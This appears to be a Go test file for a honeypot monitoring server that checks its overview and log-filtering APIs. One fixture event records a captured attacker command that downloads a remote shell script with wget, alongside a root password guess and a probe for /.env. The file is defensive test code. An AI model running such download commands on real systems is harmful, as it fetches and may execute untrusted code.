package server

import (
	"encoding/json"
	"net/http"
	"testing"
	"time"

	"walkingdead/internal/model"
)

func TestOverviewAndFilteredEvents(t *testing.T) {
	s, _, _ := fixture(t)
	now := time.Now().UnixMilli()
	for i, e := range []model.Event{
		{Service: "ssh", Type: "auth_fail", SrcIP: "203.0.113.5", User: "root", Password: "root"},
		{Service: "http", Type: "connection", SrcIP: "198.51.100.9", Method: "GET", Path: "/.env"},
		{Service: "ssh", Type: "command", SrcIP: "203.0.113.5", Command: "wget http://198.51.100.20/x.sh"},
	} {
		e.ID, e.TS, e.Severity, e.Country, e.SessionID, e.SensorID = newID(), now-int64(i), "info", "Unknown", "s1", "local-"+e.Service
		if err := s.record(e); err != nil {
			t.Fatal(err)
		}
	}
	cookie := loginCookie(t, s)
	w := call(t, s, http.MethodGet, "/api/v1/overview", nil, cookie, "", "")
	requireStatus(t, w, http.StatusOK)
	var overview struct {
		ThreatLevel int `json:"threatLevel"`
		Attackers   int `json:"attackers"`
		Last24h     struct {
			Events int `json:"events"`
		} `json:"last24h"`
	}
	if json.Unmarshal(w.Body.Bytes(), &overview) != nil || overview.Attackers != 2 || overview.Last24h.Events != 3 || overview.ThreatLevel <= 0 {
		t.Fatalf("unexpected overview: %s", w.Body.String())
	}
	w = call(t, s, http.MethodGet, "/api/v1/logs/recent?service=ssh&minSeverity=critical", nil, cookie, "", "")
	requireStatus(t, w, http.StatusOK)
	var events []model.Event
	if json.Unmarshal(w.Body.Bytes(), &events) != nil || len(events) != 1 || events[0].Command == "" {
		t.Fatalf("unexpected filtered events: %s", w.Body.String())
	}
	requireStatus(t, call(t, s, http.MethodGet, "/api/v1/logs/recent?minSeverity=extreme", nil, cookie, "", ""), http.StatusBadRequest)
}

func TestEventStreamFilterMatches(t *testing.T) {
	f := eventFilter{service: "ssh", minSeverity: "high"}
	if !f.match(model.Event{Service: "ssh", Severity: "critical"}) || f.match(model.Event{Service: "ssh", Severity: "low"}) || f.match(model.Event{Service: "http", Severity: "critical"}) {
		t.Fatal("filter mismatch")
	}
}
